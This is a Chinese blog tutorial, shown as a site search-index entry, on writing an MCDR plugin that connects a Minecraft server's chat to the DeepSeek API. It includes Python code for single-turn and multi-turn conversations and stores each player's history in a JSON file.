<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>MCDR-让你的MC服务器接入AI</title>
      <link href="/posts/ec277bd3.html"/>
      <url>/posts/ec277bd3.html</url>
      
        <content type="html"><![CDATA[<h1>[MCDR] 让你的MC服务器接入AI</h1><blockquote><p>DeepSeek API终于恢复正常了。在ChatGPT刚出的时候就有过将GPT加入到MC服务器的想法，但是受限于当时的Java水平和财力，放弃了这个想法。今天下午看到DeepSeek API 开放充值了，决定实现一下曾经的想法</p></blockquote><p>这篇文章只是v1.0.0版，更新请移步github</p><p><a href="https://github.com/gubaiovo/MCDR_chat_with_ai">github</a></p><p><a href="https://platform.deepseek.com/">DeepSeek 开放平台</a></p><p><a href="https://api-docs.deepseek.com/zh-cn/">DeepSeek API文档</a></p><p><a href="https://docs.mcdreforged.com/zh-cn/latest/plugin_dev/index.html">MCDR 插件开发</a></p><p>其实之前<a href="https://blog.gubaiovo.com/posts/693deb78.html">调用Ollama API</a>时积累了很多经验，核心交互基本都是照搬</p><p>个人感觉MCDR官方文档写的过于简略了，写插件时磕磕碰碰的…</p><p>首先到ds开放平台申请一个 API key，这里不做演示了</p><p>基础核心逻辑为：<code>获取用户输入</code>→<code>发给ai，获得响应</code>→<code>把响应发给用户</code></p><h2 id="单次对话">单次对话</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> mcdreforged.api.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> openai <span class="keyword">import</span> OpenAI</span><br><span class="line"></span><br><span class="line">PLUGIN_METADATA = &#123;</span><br><span class="line">    <span class="string">&#x27;id&#x27;</span>: <span class="string">&#x27;chat_with_ds&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;version&#x27;</span>: <span class="string">&#x27;1.0.0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;Chat with DeepSeek&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;description&#x27;</span>: <span class="string">&#x27;Let your server chat with DeepSeek!&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;author&#x27;</span>: <span class="string">&#x27;gubai&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ds_key = <span class="string">&quot;your-key&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">on_load</span>(<span class="params">server: ServerInterface, old_module</span>):</span><br><span class="line">    server.register_help_message(<span class="string">&#x27;!!ds &lt;message&gt;&#x27;</span>, <span class="string">&#x27;与DeepSeek对话&#x27;</span>)</span><br><span class="line"><span class="comment"># 注册命令</span></span><br><span class="line">    server.register_command(</span><br><span class="line">        <span class="type">Literal</span>(<span class="string">&#x27;!!ds&#x27;</span>).then(</span><br><span class="line">            GreedyText(<span class="string">&#x27;msg&#x27;</span>).runs(get_user_content)</span><br><span class="line">        )</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_user_content</span>(<span class="params">source: CommandSource, context: CommandContext</span>):</span><br><span class="line">    msg = context[<span class="string">&#x27;msg&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> source.is_player:</span><br><span class="line">        <span class="comment"># 给玩家直接回复</span></span><br><span class="line">        source.reply(<span class="string">f&quot;§a[DeepSeek]§r 收到你的消息：<span class="subst">&#123;msg&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="comment"># DeepSeek回复</span></span><br><span class="line">        source.reply(<span class="string">f&quot;§a[DeepSeek]§r <span class="subst">&#123;send_message_to_ds(msg)&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="comment"># 广播给所有玩家</span></span><br><span class="line">        <span class="comment"># source.get_server().execute(f&#x27;tellraw @a &#123;&#123;&quot;text&quot;:&quot;§6[系统广播]§r &#123;source.player&#125; 对DeepSeek说：&#123;msg&#125;&quot;&#125;&#125;&#x27;)</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        source.reply(<span class="string">&quot;§c该命令只能由玩家使用&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_message_to_ds</span>(<span class="params">msg: <span class="built_in">str</span></span>):</span><br><span class="line">    client = OpenAI(api_key=ds_key, base_url=<span class="string">&quot;https://api.deepseek.com&quot;</span>)</span><br><span class="line">    response = client.chat.completions.create(</span><br><span class="line">    model=<span class="string">&quot;deepseek-chat&quot;</span>,</span><br><span class="line">    messages=[</span><br><span class="line">        &#123;<span class="string">&quot;role&quot;</span>: <span class="string">&quot;system&quot;</span>, <span class="string">&quot;content&quot;</span>: <span class="string">&quot;You are a helpful assistant&quot;</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;role&quot;</span>: <span class="string">&quot;user&quot;</span>, <span class="string">&quot;content&quot;</span>: msg&#125;,</span><br><span class="line">    ],</span><br><span class="line">    stream=<span class="literal">False</span></span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">return</span> response.choices[<span class="number">0</span>].message.content</span><br></pre></td></tr></table></figure><p>逻辑很简单，在入口注册命令 <code>!!ds &lt;message&gt;</code>，其中<code>&lt;message&gt;</code> 是玩家向ai发送的内容，调用 <code>get_user_content</code> ，将<code>&lt;message&gt;</code> 作为参数传入。</p><p><code>GreedyText('msg')</code> 可以理解为 <code>&lt;message&gt;</code> 的key是 <code>msg</code> 。<code>context['msg']</code> 就是 <code>&lt;message&gt;</code> 。</p><p><code>send_message_to_ds</code> 参考ds api文档</p><p><img src="/assets/post_img/dev/%E8%AE%A9%E4%BD%A0%E7%9A%84MC%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%8E%A5%E5%85%A5AI/image-20250301201042941.png" alt="image-20250301201042941"></p><p>这样实现最简单的单次对话。将.py文件放入插件文件夹并重载，尝试第一次对话</p><p><img src="/assets/post_img/dev/%E8%AE%A9%E4%BD%A0%E7%9A%84MC%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%8E%A5%E5%85%A5AI/image-20250301201259105.png" alt="image-20250301201259105"></p><h2 id="多轮对话">多轮对话</h2><p>参考之前调用 Ollama API的经历，实际上就是把每次的输入和输出拼起来一起发给ai</p><p>为了保证每次关服不丢失历史数据，且让玩家数据隔离，可以通过文件存储，其中文件以玩家名命名~~(为什么不用uuid？因为不知道MCDR uuid的接口是什么…)~~</p><p>既然要实现多轮对话，那么查看对话历史和清空对话历史便是标配了。先在入口注册这几个命令。为了区分，用 <code>dsp</code> 作为主命令~~(deepseek plus)~~</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">on_load</span>(<span class="params">server: ServerInterface, old_module</span>):</span><br><span class="line">    server.register_help_message(<span class="string">&#x27;!!ds &lt;message&gt;&#x27;</span>, <span class="string">&#x27;与DeepSeek对话&#x27;</span>)</span><br><span class="line">    <span class="comment"># 使用现代命令构建方式</span></span><br><span class="line">    server.register_command(</span><br><span class="line">        <span class="type">Literal</span>(<span class="string">&#x27;!!dsp&#x27;</span>).then(</span><br><span class="line">            <span class="type">Literal</span>(<span class="string">&#x27;help&#x27;</span>).runs(get_help)</span><br><span class="line">        ).then(</span><br><span class="line">            <span class="type">Literal</span>(<span class="string">&#x27;history&#x27;</span>).runs(get_history)</span><br><span class="line">        ).then(</span><br><span class="line">            <span class="type">Literal</span>(<span class="string">&#x27;clear&#x27;</span>).runs(clear_history)</span><br><span class="line">        ).then(</span><br><span class="line">            GreedyText(<span class="string">&#x27;message&#x27;</span>).runs(get_user_content)</span><br><span class="line">        )</span><br><span class="line">    )</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_help</span>(<span class="params">source: CommandSource</span>):</span><br><span class="line">    source.reply(<span class="string">&quot;§a[DeepSeek]§r 命令：\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;§6!!dsp help§r 查看帮助\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;§6!!dsp history§r 查看历史消息\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;§6!!dsp clear§r 清空历史消息\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;§6!!dsp &lt;message&gt;§r 与DeepSeek对话&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_history</span>(<span class="params">source: CommandSource</span>):</span><br><span class="line">...</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">clear_history</span>(<span class="params">source: CommandSource</span>):</span><br><span class="line">...</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_user_content</span>(<span class="params">source: CommandSource, context: CommandContext</span>):</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>一定要注意的是注册命令顺序，<code>help</code> <code>history</code> <code>clear</code> 三个是并列的，但 <code>GreedyText</code> 属于 <strong>贪婪的文本参数</strong>，MCDR描述如下</p><p><img src="/assets/post_img/dev/%E8%AE%A9%E4%BD%A0%E7%9A%84MC%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%8E%A5%E5%85%A5AI/image-20250301202714803.png" alt="image-20250301202714803"></p><p>如果把 <code>GreedyText('message').runs(get_user_content)</code> 放到第一个注册，那么会覆盖后面所有待注册的命令，也就是说，后面所有命令都将无效。</p><p>为了让结构更清晰，我们可以定义一个数据管理类，专门对数据进行操作。</p><p>MCDR 插件数据保存位置为根目录下的 <code>config</code> 文件夹下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">path = <span class="string">&#x27;./config/DeepSeek/&#x27;</span> <span class="comment"># 这里DeepSeek代指插件文件夹</span></span><br></pre></td></tr></table></figure><p>假设一个玩家叫 name，那么完整路径可以写为</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">path = <span class="string">&#x27;./config/DeepSeek/&#x27;</span> + name + <span class="string">&#x27;.json&#x27;</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">DataManager</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, source: CommandSource, name: <span class="built_in">str</span></span>):</span><br><span class="line">        <span class="variable language_">self</span>.initial_message = [&#123;<span class="string">&quot;role&quot;</span>: <span class="string">&quot;system&quot;</span>, <span class="string">&quot;content&quot;</span>: <span class="string">&quot;你是一个Minecraft助手，负责解答玩家关于Minecraft相关问题。解答问题时，要联系上下文，给出精确的答案。&quot;</span>&#125;]</span><br><span class="line">        <span class="variable language_">self</span>.source = source</span><br><span class="line">        <span class="variable language_">self</span>.name = name</span><br><span class="line">        <span class="variable language_">self</span>.history_path = <span class="string">&#x27;./config/DeepSeek/&#x27;</span> + name + <span class="string">&#x27;.json&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(<span class="variable language_">self</span>.history_path):</span><br><span class="line">            os.makedirs(os.path.dirname(<span class="variable language_">self</span>.history_path), exist_ok=<span class="literal">True</span>)</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(<span class="variable language_">self</span>.history_path, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">                json.dump(<span class="variable language_">self</span>.initial_message, file)</span><br><span class="line">    <span class="comment"># 获取拼接好的message</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_send_message</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="variable language_">self</span>.history_path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">            messages =  json.load(file)</span><br><span class="line">        <span class="keyword">return</span> messages</span><br><span class="line"><span class="comment"># 获取历史消息</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_history</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="variable language_">self</span>.history_path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">            messages =  json.load(file)</span><br><span class="line">        history = <span class="string">&quot;\n--------------------history--------------------\n&quot;</span></span><br><span class="line">        <span class="keyword">for</span> index, message <span class="keyword">in</span> <span class="built_in">enumerate</span>(messages):</span><br><span class="line">            history += <span class="string">f&quot;##<span class="subst">&#123;index&#125;</span>##: <span class="subst">&#123;message[<span class="string">&#x27;role&#x27;</span>]&#125;</span>: <span class="subst">&#123;message[<span class="string">&#x27;content&#x27;</span>]&#125;</span>\n&quot;</span></span><br><span class="line">        history += <span class="string">&quot;-----------------------------------------------\n&quot;</span></span><br><span class="line">        <span class="variable language_">self</span>.source.reply(history)</span><br><span class="line">    <span class="comment"># 向文件添加消息</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">add_message</span>(<span class="params">self, role: <span class="built_in">str</span>, user_input: <span class="built_in">str</span></span>):</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="variable language_">self</span>.history_path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">            messages = json.load(file)</span><br><span class="line">        messages.append(&#123;<span class="string">&quot;role&quot;</span>: role, <span class="string">&quot;content&quot;</span>: user_input&#125;)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="variable language_">self</span>.history_path, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">            json.dump(messages, file)</span><br><span class="line">    <span class="comment"># 清空历史</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">clear_history</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="variable language_">self</span>.history_path, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">            json.dump(<span class="variable language_">self</span>.initial_message, file)</span><br><span class="line">        <span class="variable language_">self</span>.source.reply(<span class="string">&quot;Clear history&quot;</span>)</span><br></pre></td></tr></table></figure><p>因为向ai发送的请求中，message是一个列表，所以我们存储也应当是一个列表，这样只需要简单读取发送即可，而不需要考虑格式问题。关于 <code>role</code> <code>system</code> 等参数，参考调用Ollama API那篇文章</p><p>这样命令的函数便很好写了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_history</span>(<span class="params">source: CommandSource</span>):</span><br><span class="line">    player_data = DataManager(source, source.player)</span><br><span class="line">    player_data.get_history()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">clear_history</span>(<span class="params">source: CommandSource</span>):</span><br><span class="line">    player_data = DataManager(source, source.player)</span><br><span class="line">    player_data.clear_history()</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_user_content</span>(<span class="params">source: CommandSource, context: CommandContext</span>):</span><br><span class="line">    message = context[<span class="string">&#x27;message&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> source.is_player:</span><br><span class="line">        player_data = DataManager(source, source.player)</span><br><span class="line">        player_data.add_message(<span class="string">&quot;user&quot;</span>, message)</span><br><span class="line">        source.reply(<span class="string">f&quot;§a[DeepSeek]§r 收到你的消息：<span class="subst">&#123;message&#125;</span>&quot;</span>)</span><br><span class="line">        send_message = player_data.get_send_message() <span class="comment"># 获取拼接好的message</span></span><br><span class="line">        response = send_message_to_ds(send_message)</span><br><span class="line">        source.reply(<span class="string">f&quot;§a[DeepSeek]§r <span class="subst">&#123;response&#125;</span>&quot;</span>)</span><br><span class="line">        player_data.add_message(<span class="string">&quot;assistant&quot;</span>, response)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        source.reply(<span class="string">&quot;§c该命令只能由玩家使用&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_message_to_ds</span>(<span class="params">send_message: <span class="built_in">str</span></span>):</span><br><span class="line">    client = OpenAI(api_key=key, base_url=<span class="string">&quot;https://api.deepseek.com&quot;</span>)</span><br><span class="line">    response = client.chat.completions.create(</span><br><span class="line">    model=<span class="string">&quot;deepseek-chat&quot;</span>,</span><br><span class="line">    messages=send_message,</span><br><span class="line">    stream=<span class="literal">False</span></span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">return</span> response.choices[<span class="number">0</span>].message.content</span><br></pre></td></tr></table></figure><p><img src="/assets/post_img/dev/%E8%AE%A9%E4%BD%A0%E7%9A%84MC%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%8E%A5%E5%85%A5AI/image-20250301203949118.png" alt="image-20250301203949118"></p><p><img src="/assets/post_img/dev/%E8%AE%A9%E4%BD%A0%E7%9A%84MC%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%8E%A5%E5%85%A5AI/image-20250301204154692.png" alt="image-20250301204154692"></p><p><img src="/assets/post_img/dev/%E8%AE%A9%E4%BD%A0%E7%9A%84MC%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%8E%A5%E5%85%A5AI/image-20250301204236532.png" alt="image-20250301204236532"></p><p><img src="/assets/post_img/dev/%E8%AE%A9%E4%BD%A0%E7%9A%84MC%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%8E%A5%E5%85%A5AI/image-20250301204301717.png" alt="image-20250301204301717"></p><h2 id="ALL-CODES">ALL CODES</h2><p>单次对话</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> mcdreforged.api.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> openai <span class="keyword">import</span> OpenAI</span><br><span class="line"></span><br><span class="line">PLUGIN_METADATA = &#123;</span><br><span class="line">    <span class="string">&#x27;id&#x27;</span>: <span class="string">&#x27;chat_with_ds&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;version&#x27;</span>: <span class="string">&#x27;1.0.0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;Chat with DeepSeek&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;description&#x27;</span>: <span class="string">&#x27;Let your server chat with DeepSeek!&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;author&#x27;</span>: <span class="string">&#x27;gubai&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ds_key = <span class="string">&quot;YOUR_API_KEY&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">on_load</span>(<span class="params">server: ServerInterface, old_module</span>):</span><br><span class="line">    server.register_help_message(<span class="string">&#x27;!!ds &lt;message&gt;&#x27;</span>, <span class="string">&#x27;与DeepSeek对话&#x27;</span>)</span><br><span class="line">    server.register_command(</span><br><span class="line">        <span class="type">Literal</span>(<span class="string">&#x27;!!ds&#x27;</span>).then(</span><br><span class="line">            GreedyText(<span class="string">&#x27;msg&#x27;</span>).runs(get_user_content)</span><br><span class="line">        )</span><br><span class="line">    )</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_user_content</span>(<span class="params">source: CommandSource, context: CommandContext</span>):</span><br><span class="line">    msg = context[<span class="string">&#x27;msg&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> source.is_player:</span><br><span class="line">        source.reply(<span class="string">f&quot;§a[DeepSeek]§r 收到你的消息：<span class="subst">&#123;msg&#125;</span>&quot;</span>)</span><br><span class="line">        source.reply(<span class="string">f&quot;§a[DeepSeek]§r <span class="subst">&#123;send_message_to_ds(msg)&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        source.reply(<span class="string">&quot;§c该命令只能由玩家使用&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_message_to_ds</span>(<span class="params">msg: <span class="built_in">str</span></span>):</span><br><span class="line">    client = OpenAI(api_key=ds_key, base_url=<span class="string">&quot;https://api.deepseek.com&quot;</span>)</span><br><span class="line">    response = client.chat.completions.create(</span><br><span class="line">    model=<span class="string">&quot;deepseek-chat&quot;</span>,</span><br><span class="line">    messages=[</span><br><span class="line">        &#123;<span class="string">&quot;role&quot;</span>: <span class="string">&quot;system&quot;</span>, <span class="string">&quot;content&quot;</span>: <span class="string">&quot;You are a helpful assistant&quot;</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;role&quot;</span>: <span class="string">&quot;user&quot;</span>, <span class="string">&quot;content&quot;</span>: msg&#125;,</span><br><span class="line">    ],</span><br><span class="line">    stream=<span class="literal">False</span></span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">return</span> response.choices[<span class="number">0</span>].message.content</span><br></pre></td></tr></table></figure><p>多轮对话</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> mcdreforged.api.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> openai <span class="keyword">import</span> OpenAI</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">PLUGIN_METADATA = &#123;</span><br><span class="line">    <span class="string">&#x27;id&#x27;</span>: <span class="string">&#x27;chat_with_AI&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;version&#x27;</span>: <span class="string">&#x27;1.0.0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;Chat with AI&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;description&#x27;</span>: <span class="string">&#x27;Let your server chat with AI&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;author&#x27;</span>: <span class="string">&#x27;gubai&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">key = <span class="string">&quot;YOUR_API_KEY&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">DataManager</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, source: CommandSource, name: <span class="built_in">str</span></span>):</span><br><span class="line">        <span class="variable language_">self</span>.initial_message = [&#123;<span class="string">&quot;role&quot;</span>: <span class="string">&quot;system&quot;</span>, <span class="string">&quot;content&quot;</span>: <span class="string">&quot;你是一个Minecraft助手，负责解答玩家关于Minecraft相关问题。解答问题时，要联系上下文，给出精确的答案。&quot;</span>&#125;]</span><br><span class="line">        <span class="variable language_">self</span>.source = source</span><br><span class="line">        <span class="variable language_">self</span>.name = name</span><br><span class="line">        <span class="variable language_">self</span>.history_path = <span class="string">&#x27;./config/DeepSeek/&#x27;</span> + name + <span class="string">&#x27;.json&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(<span class="variable language_">self</span>.history_path):</span><br><span class="line">            os.makedirs(os.path.dirname(<span class="variable language_">self</span>.history_path), exist_ok=<span class="literal">True</span>)</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(<span class="variable language_">self</span>.history_path, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">                json.dump(<span class="variable language_">self</span>.initial_message, file)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_send_message</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="variable language_">self</span>.history_path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">            messages =  